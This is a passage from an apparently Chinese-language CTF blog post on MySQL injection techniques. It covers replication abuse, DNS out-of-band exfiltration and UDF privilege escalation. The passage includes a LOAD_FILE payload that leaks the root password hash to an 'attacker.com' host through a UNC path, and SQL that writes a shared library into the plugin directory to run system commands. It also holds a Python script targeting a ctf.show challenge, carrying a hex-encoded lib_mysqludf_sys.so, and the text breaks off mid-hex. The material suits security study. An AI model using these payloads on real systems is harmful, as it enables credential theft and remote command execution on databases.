restart</code></p><p>è‡ªå·±çš„vpsä½œä¸ºä¸»ï¼Œé¢˜ç›®ç¯å¢ƒä½œä¸ºä»ã€‚ä¸»æœåŠ¡å™¨æ‰§è¡Œï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CREATE USER &#x27;atest&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;testtest&#x27;;</span><br><span class="line">grant replication slave on . to &#x27;atest&#x27;@&#x27;%&#x27;;</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>select database(); show tables; desc game;</code> ç­‰æŸ¥è¯¢å‘½ä»¤æŸ¥çœ‹ä»æœåŠ¡å™¨ä¸Šçš„è¡¨ç»“æ„ï¼Œå°†ä»æœåŠ¡å™¨ä¸Šçš„æ•°æ®åº“ç»“æ„ä¸€æ¯”ä¸€å¤åˆ»åˆ°ä¸»æœåŠ¡å™¨ä¸Šï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CREATE DATABASE IF NOT EXISTS game_data;</span><br><span class="line">use game_data</span><br><span class="line">CREATE TABLE IF NOT EXISTS game ( round int(20) , choice varchar(256) ) ;</span><br></pre></td></tr></table></figure><p>åœ¨ä¸»æœåŠ¡å™¨mysqlä¸­æ‰§è¡Œï¼š<code>show master status;</code></p><p>è®°å½•ä¸‹æ¥ Fileå’Œ Positionï¼š<code>mysql-bin.000001 1376</code></p><p>åœ¨ä»æœåŠ¡å™¨(é¢˜ç›®ç¯å¢ƒ)æ‰§è¡Œï¼š</p><p><code>CHANGE MASTER TO MASTER_HOST=&#39;ä¸»æœåŠ¡å™¨ip&#39;, MASTER_USER=&#39;atest&#39;, MASTER_PASSWORD=&#39;testtest&#39;, MASTER_LOG_FILE=&#39;mariadb-bin.000001(è®°å½•çš„å€¼)&#39;, MASTER_LOG_POS=1365(è®°å½•çš„å€¼);</code></p><p>æ˜¾ç¤ºä¸‹é¢è¿™ä¸ªè¡¨ç¤ºæˆåŠŸè¿æ¥ä¸Šï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">start slave;</span><br><span class="line">show slave status;</span><br></pre></td></tr></table></figure><p>ä¸»æœåŠ¡å™¨ä¸­æ‰§è¡Œï¼š<code>INSERT INTO game ( round , choice ) VALUES (&#39;1&#39;, &#39;R&#39;), (&#39;2&#39;, &#39;R&#39;),(&#39;3&#39;, &#39;R&#39;), (&#39;4&#39;, &#39;R&#39;),(&#39;5&#39;, &#39;R&#39;), (&#39;6&#39;, &#39;R&#39;),(&#39;7&#39;,&#39;R&#39;), (&#39;8&#39;, &#39;R&#39;),(&#39;9&#39;, &#39;R&#39;), (&#39;10&#39;, &#39;R&#39;);</code></p><p>æ’å…¥ä»æœåŠ¡å™¨è¡¨æ•°æ®æˆåŠŸã€‚</p><p>å‚è€ƒï¼šSYCTF 2023 - Confronting robots</p><h4 id="è¿œç¨‹è¿æ¥"><a href="#è¿œç¨‹è¿æ¥" class="headerlink" title="è¿œç¨‹è¿æ¥"></a>è¿œç¨‹è¿æ¥</h4><p>mysqlè¿œç¨‹è¿æ¥ä¸­å¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼ˆ<code>system</code> å…³é”®å­—ï¼‰ã€‚</p><blockquote><p>system (!) Execute a system shell command.</p></blockquote><h4 id="å‚è€ƒæ–‡"><a href="#å‚è€ƒæ–‡" class="headerlink" title="å‚è€ƒæ–‡"></a>å‚è€ƒæ–‡</h4><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7169">https://xz.aliyun.com/t/7169</a></p><p>â€‹</p><h3 id="DNSå¸¦å¤–æ³¨å…¥ï¼ˆOOBï¼‰"><a href="#DNSå¸¦å¤–æ³¨å…¥ï¼ˆOOBï¼‰" class="headerlink" title="DNSå¸¦å¤–æ³¨å…¥ï¼ˆOOBï¼‰"></a>DNSå¸¦å¤–æ³¨å…¥ï¼ˆOOBï¼‰</h3><p>out-of-bandå¸¦å¤–æ•°æ®ï¼ˆOOBï¼‰ä¸inbandç›¸åï¼Œå®ƒæ˜¯ä¸€ç§é€šè¿‡å…¶ä»–ä¼ è¾“æ–¹å¼æ¥çªƒå–æ•°æ®çš„æŠ€æœ¯ï¼ˆä¾‹å¦‚åˆ©ç”¨DNSè§£æåè®®å’Œç”µå­é‚®ä»¶ï¼‰ã€‚OOBæŠ€æœ¯é€šå¸¸éœ€è¦æ˜“å—æ”»å‡»çš„å®ä½“ç”Ÿæˆå‡ºç«™TCP/UDP/ICMPè¯·æ±‚ï¼Œç„¶åå…è®¸æ”»å‡»è€…æ³„éœ²æ•°æ®ã€‚OOBæ”»å‡»çš„æˆåŠŸåŸºäºå‡ºå£é˜²ç«å¢™è§„åˆ™ï¼Œå³æ˜¯å¦å…è®¸æ¥è‡ªæ˜“å—æ”»å‡»çš„ç³»ç»Ÿå’Œå¤–å›´é˜²ç«å¢™çš„å‡ºç«™è¯·æ±‚ã€‚è€Œä»åŸŸåæœåŠ¡å™¨ï¼ˆDNSï¼‰ä¸­æå–æ•°æ®ï¼Œåˆ™è¢«è®¤ä¸ºæ˜¯æœ€éšè”½æœ‰æ•ˆçš„æ–¹æ³•ã€‚</p><p><strong>åˆ©ç”¨åŸç†ï¼š</strong></p><p><img src="/2020/05/16/web-SQL%E6%B3%A8%E5%85%A5/SQLç›²æ³¨21.png" alt="img"></p><p><strong>åˆ©ç”¨æ¡ä»¶ï¼š</strong></p><p>éœ€è¦Windowsç¯å¢ƒ</p><p>1ã€DBMSä¸­éœ€è¦æœ‰å¯ç”¨çš„ï¼Œèƒ½ç›´æ¥æˆ–é—´æ¥å¼•å‘DNSè§£æè¿‡ç¨‹çš„å­ç¨‹åºï¼Œå³ä½¿ç”¨åˆ°UNC</p><p>2ã€Linuxæ²¡æœ‰UNCè·¯å¾„ï¼Œæ‰€ä»¥å½“å¤„äºLinuxç¯å¢ƒï¼Œä¸èƒ½ä½¿ç”¨è¯¥æ–¹å¼è·å–æ•°æ®</p><p><strong>å·¥å…·ï¼š</strong></p><p><a target="_blank" rel="noopener" href="http://www.dnslog.cn/">DNSLog.cn</a></p><p><a target="_blank" rel="noopener" href="http://ceye.io/">CEYE</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#secure_file_privæŒ‡å®šæ–‡ä»¶å¤¹æˆ–ä¸ºç©ºï¼ˆæ²¡æœ‰è®¾ç½®ï¼‰ï¼ˆmysql&gt;5.5.53é»˜è®¤nullï¼Œç¦ç”¨å¯¼å…¥å¯¼å‡ºï¼‰</span><br><span class="line">#æŸ¥è¯¢secure_file_priv</span><br><span class="line">select @@secure_file_priv;</span><br><span class="line">select @@global.secure_file_priv;</span><br><span class="line">show variables like &quot;secure_file_priv&quot;;</span><br><span class="line"></span><br><span class="line">#æ³¨å…¥</span><br><span class="line">SELECT LOAD_FILE(CONCAT(&#x27;\\\\&#x27;,(SELECT password FROM mysql.user WHERE user=&#x27;root&#x27; LIMIT 1),&#x27;.attacker.com\\foobar&#x27;));</span><br><span class="line">select load_file(concat(0x5c5c5c5c,(select database()),0x2E62383862306437653533326238663635333164322E642E7A6861636B2E63615C5C612E747874));</span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="UDF"><a href="#UDF" class="headerlink" title="UDF"></a>UDF</h3><p>UDFæ˜¯mysqlçš„ä¸€ä¸ªæ‹“å±•æ¥å£ï¼ŒUDFï¼ˆUserdefined functionï¼‰å¯ç¿»è¯‘ä¸ºç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ï¼Œè¿™ä¸ªæ˜¯ç”¨æ¥æ‹“å±•Mysqlçš„æŠ€æœ¯æ‰‹æ®µã€‚å½“æˆ‘ä»¬æœ‰è¯»å–å’Œå†™å…¥æƒé™ä»¥åï¼Œæˆ‘ä»¬å°±å¯ä»¥å°è¯•ä½¿ç”¨UDFææƒçš„æ–¹æ³•ï¼Œä»æ•°æ®åº“çš„rootæƒé™æå‡åˆ°ç³»ç»Ÿçš„ç®¡ç†å‘˜æƒé™ã€‚</p><p>å‚è€ƒï¼š</p><p><a target="_blank" rel="noopener" href="https://www.k0rz3n.com/2018/10/21/Mysql%20%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8/#%E4%B8%89%E3%80%81MYSQL-UDF-%E6%8F%90%E6%9D%83">Mysql UDF ææƒ</a></p><p><a target="_blank" rel="noopener" href="https://www.sqlsec.com/tools/udf.html">MySQL UDFææƒåå…­è¿›åˆ¶æŸ¥è¯¢</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#x27;%plugin%&#x27;;</span><br><span class="line"># é€šå¸¸æ˜¯/usr/lib/mysql/plugin/</span><br><span class="line"></span><br><span class="line">select unhex(&#x27;udf.soçš„åå…­è¿›åˆ¶&#x27;) into dumpfile</span><br><span class="line">&#x27;/usr/lib/mysql/plugin/mysqludf.so&#x27;;</span><br><span class="line"></span><br><span class="line">create function sys_eval returns string soname &#x27;mysqludf.so&#x27;;</span><br><span class="line"></span><br><span class="line">select sys_eval(&#x27;whoami&#x27;);</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#å‚è€ƒè„šæœ¬</span></span><br><span class="line"><span class="comment">#ç¯å¢ƒï¼šLinux/MariaDB</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://15700a19-71aa-4c90-b3ca-b6db9d77c56d.chall.ctf.show/api/?id=&#x27;</span></span><br><span class="line">code=<span class="string">&#x27;7F454C4602010100000000000000000003003E0001000000800A000000000000400000000000000058180000000000000000000040003800060040001C0019000100000005000000000000000000000000000000000000000000000000000000C414000000000000C41400000000000000002000000000000100000006000000C814000000000000C814200000000000C8142000000000004802000000000000580200000000000000002000000000000200000006000000F814000000000000F814200000000000F814200000000000800100000000000080010000000000000800000000000000040000000400000090010000000000009001000000000000900100000000000024000000000000002400000000000000040000000000000050E574640400000044120000000000004412000000000000441200000000000084000000000000008400000000000000040000000000000051E5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000040000001400000003000000474E5500D7FF1D94176ABA0C150B4F3694D2EC995AE8E1A8000000001100000011000000020000000700000080080248811944C91CA44003980468831100000013000000140000001600000017000000190000001C0000001E000000000000001F00000000000000200000002100000022000000230000002400000000000000CE2CC0BA673C7690EBD3EF0E78722788B98DF10ED971581CA868BE12BBE3927C7E8B92CD1E7066A9C3F9BFBA745BB073371974EC4345D5ECC5A62C1CC3138AFF3B9FD4A0AD73D1C50B5911FEAB5FBE1200000000000000000000000000000000000000000000000000000000000000000300090088090000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000CD00000012000000000000000000000000000000000000001E0100001200000000000000000000000000000000000000620100001200000000000000000000000000000000000000E30000001200000000000000000000000000000000000000B90000001200000000000000000000000000000000000000680100001200000000000000000000000000000000000000160000002200000000000000000000000000000000000000540000001200000000000000000000000000000000000000F00000001200000000000000000000000000000000000000B200000012000000000000000000000000000000000000005A01000012000000000000000000000000000000000000005201000012000000000000000000000000000000000000004C0100001200000000000000000000000000000000000000E800000012000B00D10D000000000000D1000000000000003301000012000B00A90F0000000000000A000000000000001000000012000C00481100000000000000000000000000007800000012000B009F0B0000000000004C00000000000000FF0000001200090088090000000000000000000000000000800100001000F1FF101720000000000000000000000000001501000012000B00130F0000000000002F000000000000008C0100001000F1FF201720000000000000000000000000009B00000012000B00480C0000000000000A000000000000002501000012000B00420F0000000000006700000000000000AA00000012000B00520C00000000000063000000000000005B00000012000B00950B0000000000000A000000000000008E00000012000B00EB0B0000000000005D00000000000000790100001000F1FF101720000000000000000000000000000501000012000B00090F0000000000000A00000000000000C000000012000B00B50C000000000000F100000000000000F700000012000B00A20E00000000000067000000000000003900000012000B004C0B0000000000004900000000000000D400000012000B00A60D0000000000002B000000000000004301000012000B00B30F0000000000005501000000000000005F5F676D6F6E5F73746172745F5F005F66696E69005F5F6378615F66696E616C697A65005F4A765F5265676973746572436C6173736573006C69625F6D7973716C7564665F7379735F696E666F5F696E6974006D656D637079006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974006C69625F6D7973716C7564665F7379735F696E666F007379735F6765745F696E6974007379735F6765745F6465696E6974007379735F67657400676574656E76007374726C656E007379735F7365745F696E6974006D616C6C6F63007379735F7365745F6465696E69740066726565007379735F73657400736574656E76007379735F657865635F696E6974007379735F657865635F6465696E6974007379735F657865630073797374656D007379735F6576616C5F696E6974007379735F6576616C5F6465696E6974007379735F6576616C00706F70656E007265616C6C6F63007374726E6370790066676574730070636C6F7365006C6962632E736F2E36005F6564617461005F5F6273735F7374617274005F656E6400474C4942435F322E322E3500000000000000000000020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001006F0100001000000000000000751A6909000002009101000000000000F0142000000000000800000000000000F0142000000000007816200000000000060000000200000000000000000000008016200000000000060000000300000000000000000000008816200000000000060000000A0000000000000000000000A81620000000000007000000040000000000000000000000B01620000000000007000000050000000000000000000000B81620000000000007000000060000000000000000000000C01620000000000007000000070000000000000000000000C81620000000000007000000080000000000000000000000D01620000000000007000000090000000000000000000000D816200000000000070000000A0000000000000000000000E016200000000000070000000B0000000000000000000000E816200000000000070000000C0000000000000000000000F016200000000000070000000D0000000000000000000000F816200000000000070000000E00000000000000000000000017200000000000070000000F00000000000000000000000817200000000000070000001000000000000000000000004883EC08E8EF000000E88A010000E8750700004883C408C3FF35F20C2000FF25F40C20000F1F4000FF25F20C20006800000000E9E0FFFFFFFF25EA0C20006801000000E9D0FFFFFFFF25E20C20006802000000E9C0FFFFFFFF25DA0C20006803000000E9B0FFFFFFFF25D20C20006804000000E9A0FFFFFFFF25CA0C20006805000000E990FFFFFFFF25C20C20006806000000E980FFFFFFFF25BA0C20006807000000E970FFFFFFFF25B20C20006808000000E960FFFFFFFF25AA0C20006809000000E950FFFFFFFF25A20C2000680A000000E940FFFFFFFF259A0C2000680B000000E930FFFFFFFF25920C2000680C000000E920FFFFFF4883EC08488B05ED0B20004885C07402FFD04883C408C390909090909090909055803D680C2000004889E5415453756248833DD00B200000740C488D3D2F0A2000E84AFFFFFF488D1D130A20004C8D25040A2000488B053D0C20004C29E348C1FB034883EB014839D873200F1F4400004883C0014889051D0C200041FF14C4488B05120C20004839D872E5C605FE0B2000015B415CC9C3660F1F84000000000048833DC009200000554889E5741A488B054B0B20004885C0740E488D3DA7092000C9FFE00F1F4000C9C39090554889E54883EC3048897DE8488975E0488955D8488B45E08B0085C07421488D0DE7050000488B45D8BA320000004889CE4889C7E89BFEFFFFC645FF01EB04C645FF000FB645FFC9C3554889E548897DF8C9C3554889E54883EC3048897DF8488975F0488955E848894DE04C8945D84C894DD0488D0DCA050000488B45E8BA1F0000004889CE4889C7E846FEFFFF488B45E048C7001E000000488B45E8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F801751C488B45F0488B40088B0085C0750E488B45F8C60001B800000000EB20488D0D83050000488B45E8BA2B0000004889CE4889C7E8DFFDFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC4048897DE8488975E0488955D848894DD04C8945C84C894DC0488B45E0488B4010488B004889C7E8BBFDFFFF488945F848837DF8007509488B45C8C60001EB16488B45F84889C7E84BFDFFFF4889C2488B45D0488910488B45F8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F8027425488D0D05050000488B45E8BA1F0000004889CE4889C7E831FDFFFFB801000000E9AB000000488B45F0488B40088B0085C07422488D0DF2040000488B45E8BA280000004889CE4889C7E8FEFCFFFFB801000000EB7B488B45F0488B40084883C004C70000000000488B45F0488B4018488B10488B45F0488B40184883C008488B00488D04024883C0024889C7E84BFCFFFF4889C2488B45F848895010488B45F8488B40104885C07522488D0DA4040000488B45E8BA1A0000004889CE4889C7E888FCFFFFB801000000EB05B800000000C9C3554889E54883EC1048897DF8488B45F8488B40104885C07410488B45F8488B40104889C7E811FCFFFFC9C3554889E54883EC3048897DE8488975E0488955D848894DD0488B45E8488B4010488945F0488B45E0488B4018488B004883C001480345F0488945F8488B45E0488B4018488B10488B45E0488B4010488B08488B45F04889CE4889C7E8EFFBFFFF488B45E0488B4018488B00480345F0C60000488B45E0488B40184883C008488B10488B45E0488B40104883C008488B08488B45F84889CE4889C7E8B0FBFFFF488B45E0488B40184883C008488B00480345F8C60000488B4DF8488B45F0BA010000004889CE4889C7E892FBFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0DC2020000488B45D8BA2B0000004889CE4889C7E81EFBFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC2048897DF8488975F0488955E848894DE0488B45F0488B4010488B004889C7E882FAFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0D22020000488B45D8BA2B0000004889CE4889C7E87EFAFFFFB801000000C9C3554889E548897DF8C9C3554889E54881EC500400004889BDD8FBFFFF4889B5D0FBFFFF488995C8FBFFFF48898DC0FBFFFF4C8985B8FBFFFF4C898DB0FBFFFFBF01000000E8BEF9FFFF488985C8FBFFFF48C745F000000000488B85D0FBFFFF488B4010488B00488D352C0200004889C7E852FAFFFF488945E8EB63488D85E0FBFFFF4889C7E8BDF9FFFF488945F8488B45F8488B55F04801C2488B85C8FBFFFF4889D64889C7E80CFAFFFF488985C8FBFFFF488D85E0FBFFFF488B55F0488B8DC8FBFFFF4801D1488B55F84889C64889CFE8D1F9FFFF488B45F8480145F0488B55E8488D85E0FBFFFFBE000400004889C7E831F9FFFF4885C07580488B45E84889C7E850F9FFFF488B85C8FBFFFF0FB60084C0740A4883BDC8FBFFFF00750C488B85B8FBFFFFC60001EB2B488B45F0488B95C8FBFFFF488D0402C60000488B85C8FBFFFF4889C7E8FBF8FFFF488B95C0FBFFFF488902488B85C8FBFFFFC9C39090909090909090554889E5534883EC08488B05A80320004883F8FF7419488D1D9B0320000F1F004883EB08FFD0488B034883F8FF75F14883C4085BC9C390904883EC08E84FF9FFFF4883C408C300004E6F20617267756D656E747320616C6C6F77656420287564663A206C69625F6D7973716C7564665F7379735F696E666F29000000000000006C69625F6D7973716C7564665F7379732076657273696F6E20302E302E33000045787065637465642065786163746C79206F6E6520737472696E67207479706520706172616D6574657200000000000045787065637465642065786163746C792074776F20617267756D656E74730000457870656374656420737472696E67207479706520666F72206E616D6520706172616D6574657200436F756C64206E6F7420616C6C6F63617465206D656D6F7279007200011B033B800000000F00000008F9FFFF9C00000051F9FFFFBC0000005BF9FFFFDC000000A7F9FFFFFC00000004FAFFFF1C0100000EFAFFFF3C01000071FAFFFF5C01000062FBFFFF7C0100008DFBFFFF9C0100005EFCFFFFBC010000C5FCFFFFDC010000CFFCFFFFFC010000FEFCFFFF1C02000065FDFFFF3C0200006FFDFFFF5C0200001400000000000000017A5200017810011B0C0708900100001C0000001C00000064F8FFFF4900000000410E108602430D0602440C070800001C0000003C0000008DF8FFFF0A00000000410E108602430D06450C07080000001C0000005C00000077F8FFFF4C00000000410E108602430D0602470C070800001C0000007C000000A3F8FFFF5D00000000410E108602430D0602580C070800001C0000009C000000E0F8FFFF0A00000000410E108602430D06450C07080000001C000000BC000000CAF8FFFF6300000000410E108602430D06025E0C070800001C000000DC0000000DF9FFFFF100000000410E108602430D0602EC0C070800001C000000FC000000DEF9FFFF2B00000000410E108602430D06660C07080000001C0000001C010000E9F9FFFFD100000000410E108602430D0602CC0C070800001C0000003C0100009AFAFFFF6700000000410E108602430D0602620C070800001C0000005C010000E1FAFFFF0A00000000410E108602430D06450C07080000001C0000007C010000CBFAFFFF2F00000000410E108602430D066A0C07080000001C0000009C010000DAFAFFFF6700000000410E108602430D0602620C070800001C000000BC01000021FBFFFF0A00000000410E108602430D06450C07080000001C000000DC0100000BFBFFFF5501000000410E108602430D060350010C0708000000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF00000000000000000000000000000000F01420000000000001000000000000006F010000000000000C0000000000000088090000000000000D000000000000004811000000000000F5FEFF6F00000000B8010000000000000500000000000000E805000000000000060000000000000070020000000000000A000000000000009D010000000000000B000000000000001800000000000000030000000000000090162000000000000200000000000000380100000000000014000000000000000700000000000000170000000000000050080000000000000700000000000000F0070000000000000800000000000000600000000000000009000000000000001800000000000000FEFFFF6F00000000D007000000000000FFFFFF6F000000000100000000000000F0FFFF6F000000008607000000000000F9FFFF6F0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000F81420000000000000000000000000000000000000000000B609000000000000C609000000000000D609000000000000E609000000000000F609000000000000060A000000000000160A000000000000260A000000000000360A000000000000460A000000000000560A000000000000660A000000000000760A0000000000004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D3429004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D31372900002E73796D746162002E737472746162002E7368737472746162002E6E6F74652E676E752E6275696C642D6964002E676E752E68617368002E64796E73796D002E64796E737472002E676E752E76657273696F6E002E676E752E76657273696F6E5F72002E72656C612E64796E002E72656C612E706C74002E696E6974002E74657874002E66696E69002E726F64617461002E65685F6672616D655F686472002E65685F6672616D65002E63746F7273002E64746F7273002E6A6372002E646174612E72656C2E726F002E64796E616D6963002E676F74002E676F742E706C74002E627373002E636F6D6D656E7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001B0000000700000002000000000000009001000000000000900100000000000024000000000000000000000000000000040000000000000000000000000000002E000000F6FFFF6F0200000000000000B801000000000000B801000000000000B400000000000000030000000000000008000000000000000000000000000000380000000B000000020000000000000070020000000000007002000000000000780300000000000004000000020000000800000000000000180000000000000040000000030000000200000000000000E805000000000000E8050000000000009D0100000000000000000000000000000100000000000000000000000000000048000000FFFFFF6F0200000000000000860700000000000086070000000000004A0000000000000003000000000000000200000000000000020000000000000055000000FEFFFF6F0200000000000000D007000000000000D007000000000000200000000000000004000000010000000800000000000000000000000000000064000000040000000200000000000000F007000000000000F00700000000000060000000000000000300000000000000080000000000000018000000000000006E000000040000000200000000000000500800000000000050080000000000003801000000000000030000000A000000080000000000000018000000000000007800000001000000060000000000000088090000000000008809000000000000180000000000000000000000000000000400000000000000000000000000000073000000010000000600000000000000A009000000000000A009000000000000E0000000000000000000000000000000040000000000000010000000000000007E000000010000000600000000000000800A000000000000800A000000000000C80600000000000000000000000000001000000000000000000000000000000084000000010000000600000000000000481100000000000048110000000000000E000000000000000000000000000000040000000000000000000000000000008A00000001000000020000000000000058110000000000005811000000000000EC0000000000000000000000000000000800000000000000000000000000000092000000010000000200000000000000441200000000000044120000000000008400000000000000000000000000000004000000000000000000000000000000A0000000010000000200000000000000C812000000000000C812000000000000FC01000000000000000000000000000008000000000000000000000000000000AA000000010000000300000000000000C814200000000000C8140000000000001000000000000000000000000000000008000000000000000000000000000000B1000000010000000300000000000000D814200000000000D8140000000000001000000000000000000000000000000008000000000000000000000000000000B8000000010000000300000000000000E814200000000000E8140000000000000800000000000000000000000000000008000000000000000000000000000000BD000000010000000300000000000000F014200000000000F0140000000000000800000000000000000000000000000008000000000000000000000000000000CA000000060000000300000000000000F814200000000000F8140000000000008001000000000000040000000000000008000000000000001000000000000000D3000000010000000300000000000000781620000000000078160000000000001800000000000000000000000000000008000000000000000800000000000000D8000000010000000300000000000000901620000000000090160000000000008000000000000000000000000000000008000000000000000800000000000000E1000000080000000300000000000000101720000000000010170000000000001000000000000000000000000000000008000000000000000000000000000000E60000000100000030000000000000000000000000000000101700000000000059000000000000000000000000000000010000000000000001000000000000001100000003000000000000000000000000000000000000006917000000000000EF00000000000000000000000000000001000000000000000000000000000000010000000200000000000000000000000000000000000000581F00000000000068070000000000001B0000002C00000008000000000000001800000000000000090000000300000000000000000000000000000000000000C02600000000000042030000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000100900100000000000000000000000000000000000003000200B80100000000000000000000000000000000000003000300700200000000000000000000000000000000000003000400E80500000000000000000000000000000000000003000500860700000000000000000000000000000000000003000600D00700000000000000000000000000000000000003000700F00700000000000000000000000000000000000003000800500800000000000000000000000000000000000003000900880900000000000000000000000000000000000003000A00A00900000000000000000000000000000000000003000B00800A00000000000000000000000000000000000003000C00481100000000000000000000000000000000000003000D00581100000000000000000000000000000000000003000E00441200000000000000000000000000000000000003000F00C81200000000000000000000000000000000000003001000C81420000000000000000000000000000000000003001100D81420000000000000000000000000000000000003001200E81420000000000000000000000000000000000003001300F01420000000000000000000000000000000000003001400F81420000000000000000000000000000000000003001500781620000000000000000000000000000000000003001600901620000000000000000000000000000000000003001700101720000000000000000000000000000000000003001800000000000000000000000000000000000100000002000B00800A0000000000000000000000000000110000000400F1FF000000000000000000000000000000001C00000001001000C81420000000000000000000000000002A00000001001100D81420000000000000000000000000003800000001001200E81420000000000000000000000000004500000002000B00A00A00000000000000000000000000005B00000001001700101720000000000001000000000000006A00000001001700181720000000000008000000000000007800000002000B00200B0000000000000000000000000000110000000400F1FF000000000000000000000000000000008400000001001000D01420000000000000000000000000009100000001000F00C01400000000000000000000000000009F00000001001200E8142000000000000000000000000000AB00000002000B0010110000000000000000000000000000C10000000400F1FF00000000000000000000000000000000D40000000100F1FF90162000000000000000000000000000EA00000001001300F0142000000000000000000000000000F700000001001100E0142000000000000000000000000000040100000100F1FFF81420000000000000000000000000000D01000012000B00D10D000000000000D1000000000000001501000012000B00130F0000000000002F000000000000001E01000020000000000000000000000000000000000000002D01000020000000000000000000000000000000000000004101000012000C00481100000000000000000000000000004701000012000B00A90F0000000000000A000000000000005701000012000000000000000000000000000000000000006B01000012000000000000000000000000000000000000007F01000012000B00A20E00000000000067000000000000008D01000012000B00B30F0000000000005501000000000000960100001200000000000000000000000000000000000000A901000012000B00950B0000000000000A00000000000000C601000012000B00B50C000000000000F100000000000000D30100001200000000000000000000000000000000000000E50100001200000000000000000000000000000000000000F901000012000000000000000000000000000000000000000D02000012000B004C0B00000000000049000000000000002802000022000000000000000000000000000000000000004402000012000B00A60D0000000000002B000000000000005302000012000B00EB0B0000000000005D000000000000006002000012000B00480C0000000000000A000000000000006F02000012000000000000000000000000000000000000008302000012000B00420F0000000000006700000000000000910200001200000000000000000000000000000000000000A50200001200000000000000000000000000000000000000B902000012000B00520C0000000000006300000000000000C10200001000F1FF10172000000000000000000000000000CD02000012000B009F0B0000000000004C00000000000000E30200001000F1FF20172000000000000000000000000000E80200001200000000000000000000000000000000000000FD02000012000B00090F0000000000000A000000000000000D0300001200000000000000000000000000000000000000220300001000F1FF101720000000000000000000000000002903000012000000000000000000000000000000000000003C03000012000900880900000000000000000000000000000063616C6C5F676D6F6E5F73746172740063727473747566662E63005F5F43544F525F4C4953545F5F005F5F44544F525F4C4953545F5F005F5F4A43525F4C4953545F5F005F5F646F5F676C6F62616C5F64746F72735F61757800636F6D706C657465642E363335320064746F725F6964782E36333534006672616D655F64756D6D79005F5F43544F525F454E445F5F005F5F4652414D455F454E445F5F005F5F4A43525F454E445F5F005F5F646F5F676C6F62616C5F63746F72735F617578006C69625F6D7973716C7564665F7379732E63005F474C4F42414C5F4F46465345545F5441424C455F005F5F64736F5F68616E646C65005F5F44544F525F454E445F5F005F44594E414D4943007379735F736574007379735F65786563005F5F676D6F6E5F73746172745F5F005F4A765F5265676973746572436C6173736573005F66696E69007379735F6576616C5F6465696E6974006D616C6C6F634040474C4942435F322E322E350073797374656D4040474C4942435F322E322E35007379735F657865635F696E6974007379735F6576616C0066676574734040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F6465696E69